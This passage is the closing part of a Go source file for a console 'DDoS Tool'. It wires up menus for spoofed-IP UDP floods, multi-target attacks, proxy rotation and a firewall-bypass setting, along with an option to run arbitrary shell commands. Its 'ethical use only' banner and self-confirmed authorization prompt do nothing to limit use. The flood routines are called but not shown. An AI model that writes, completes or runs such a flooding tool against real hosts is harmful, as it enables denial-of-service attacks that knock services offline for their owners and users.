		info("Proxies disabled.")
	}
}

func advancedFeatures() {
	printColor(colorPurple, "\n🛠️ Advanced Features:\n")
	printColor(colorPurple, "1. IP Spoofing Flood\n")
	printColor(colorPurple, "2. Multi-Target Attack\n")
	printColor(colorPurple, "3. Pause/Resume Attack\n")
	printColor(colorPurple, "4. Network Diagnostics\n")
	printColor(colorPurple, "5. System Info\n")
	printColor(colorPurple, "6. Run Shell Command\n")

	choice := validateInt("Choice (1-6): ", 1, 6)

	switch choice {
	case 1:
		fmt.Print(colorBlue + "Target IP: " + colorReset)
		var ip string
		fmt.Scanln(&ip)
		port := validateInt("Port: ", 1, 65535)
		duration := int(validateFloat("Duration (seconds): ", 1))
		packetSize := validateInt("Packet size: ", 1, 65500)
		udpSpoofFlood(ip, port, duration, packetSize)
		
	case 2:
		fmt.Print(colorBlue + "Target IPs (comma separated): " + colorReset)
		var targetStr string
		fmt.Scanln(&targetStr)
		targets := strings.Split(targetStr, ",")
		for i := range targets {
			targets[i] = strings.TrimSpace(targets[i])
		}
		port := validateInt("Port: ", 1, 65535)
		duration := int(validateFloat("Duration (seconds): ", 1))
		packetSize := validateInt("Packet size: ", 1, 65500)
		multiTargetAttack(targets, port, duration, packetSize)
		
	case 3:
		printColor(colorYellow, "1. Pause\n")
		printColor(colorYellow, "2. Resume\n")
		pauseChoice := validateInt("Choice (1-2): ", 1, 2)
		if pauseChoice == 1 {
			pauseAttackFunc()
		} else {
			resumeAttackFunc()
		}
		
	case 4:
		fmt.Print(colorBlue + "Target IP or Domain: " + colorReset)
		var target string
		fmt.Scanln(&target)
		networkDiagnostics(target)
		
	case 5:
		systemInfo()
		
	case 6:
		fmt.Print(colorBlue + "Shell command: " + colorReset)
		var cmd string
		fmt.Scanln(&cmd)
		output, err := Shellout(cmd)
		if err != nil {
			errorMsg(fmt.Sprintf("Command execution failed: %v", err))
		} else {
			success("Command output:")
			fmt.Println(output)
		}
	}
}

func configureSettings() {
	printColor(colorYellow, "\n⚙️ Configuration Settings:\n")
	printColor(colorYellow, fmt.Sprintf("1. Thread Count (current: %d)\n", config.ThreadCount))
	printColor(colorYellow, fmt.Sprintf("2. Auto Refresh (current: %t)\n", config.AutoRefresh))
	printColor(colorYellow, fmt.Sprintf("3. Save Logs (current: %t)\n", config.SaveLogs))
	printColor(colorYellow, "4. Reset to Default\n")

	choice := validateInt("Choice (1-4): ", 1, 4)

	switch choice {
	case 1:
		newThreads := validateInt("New thread count (1-100): ", 1, 100)
		config.ThreadCount = newThreads
		saveConfig("config.json")
		success(fmt.Sprintf("Thread count updated: %d", newThreads))
		
	case 2:
		config.AutoRefresh = !config.AutoRefresh
		saveConfig("config.json")
		success(fmt.Sprintf("Auto Refresh: %t", config.AutoRefresh))
		
	case 3:
		config.SaveLogs = !config.SaveLogs
		saveConfig("config.json")
		success(fmt.Sprintf("Save Logs: %t", config.SaveLogs))
		
	case 4:
		config = Config{
			AttackTimeout:  60,
			ThreadCount:    10,
			PacketSize:     1024,
			AutoRefresh:    true,
			SaveLogs:       true,
			BypassFirewall: false,
		}
		saveConfig("config.json")
		success("Default config restored")
	}
}

// ============ MAIN ============

func main() {
	// Set window title
	fmt.Print("\033]0;Go DDoS Tool - Ethical Testing\007")

	// Header
	printColor(colorGreen, "====================================================\n")
	printColor(colorGreen, "     Go DDoS Tool | Developed by: Khalequzzaman\n")
	printColor(colorGreen, "====================================================\n")
	printColor(colorYellow, "\n     ⚠️  ETHICAL USE ONLY  ⚠️\n")
	printColor(colorYellow, "     This tool is for:\n")
	printColor(colorYellow, "     - Internal Security Testing\n")
	printColor(colorYellow, "     - Authorized Penetration Testing\n")
	printColor(colorYellow, "     - Educational Purposes Only\n")
	printColor(colorYellow, "     - Network Performance Testing (Own Infrastructure)\n")
	printColor(colorYellow, "====================================================\n")
	printColor(colorRed, "\n     🛑 UNAUTHORIZED USE IS ILLEGAL 🛑\n")
	printColor(colorRed, "     Use only on systems you OWN or have\n")
	printColor(colorRed, "     WRITTEN PERMISSION to test.\n")
	printColor(colorRed, "     The developer is NOT responsible for misuse.\n")
	printColor(colorGreen, "====================================================\n\n")
	
	// Ask for confirmation
	printColor(colorYellow, "Do you have proper authorization to test? (yes/no): ")
	var confirmation string
	fmt.Scanln(&confirmation)
	
	if strings.ToLower(confirmation) != "yes" && strings.ToLower(confirmation) != "y" {
		printColor(colorRed, "\n[!] Authorization required. Exiting...\n")
		printColor(colorRed, "    This tool is for ethical testing only.\n")
		os.Exit(0)
	}
	
	printColor(colorGreen, "\n[✓] Authorization confirmed. Proceeding...\n\n")

	// Load config
	loadConfig("config.json")

	// Main loop
	for {
		printColor(colorYellow, "\n📋 Main Menu:\n")
		printColor(colorYellow, "1. 🚀 Start Attack (Authorized Testing)\n")
		printColor(colorYellow, "2. 🔧 Configure Proxy\n")
		printColor(colorYellow, "3. 📊 View Statistics\n")
		printColor(colorYellow, "4. 💾 Save Results\n")
		printColor(colorYellow, "5. 🛠️ Advanced Features\n")
		printColor(colorYellow, "6. 🧹 Validate Proxies\n")
		printColor(colorYellow, "7. ⚙️ Config Settings\n")
		printColor(colorYellow, "8. 📋 Show Authorization Guidelines\n")
		printColor(colorYellow, "9. 🚪 Exit\n")

		choice := validateInt("Your choice (1-9): ", 1, 9)

		switch choice {
		case 1:
			startAttack()
		case 2:
			configureProxy()
		case 3:
			showStats()
		case 4:
			saveResults("attack_results.txt")
		case 5:
			advancedFeatures()
		case 6:
			validateAllProxies()
		case 7:
			configureSettings()
		case 8:
			showEthicalGuidelines()
		case 9:
			printColor(colorGreen, "Exiting program...\n")
			return
		}
	}
}
